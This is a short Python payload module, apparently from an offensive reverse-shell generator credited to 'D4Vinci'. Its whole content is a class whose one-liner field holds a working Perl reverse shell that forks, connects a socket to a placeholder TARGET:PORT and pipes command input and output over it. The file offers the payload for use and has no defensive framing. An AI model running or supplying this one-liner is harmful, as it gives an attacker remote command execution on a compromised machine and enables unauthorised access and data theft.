class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Uses perl MIO sockets & the output of your commands will be piped back."
    function    = "reverse shell"
    liner     = """perl -MIO::Socket::INET -e "$f=fork;exit,if($f);$s=new IO::Socket::INET(PeerAddr,'TARGET:'.PORT);$s->send('shell>');STDIN->fdopen($s,r);$~->fdopen($s,w);system$_ while<>;" """
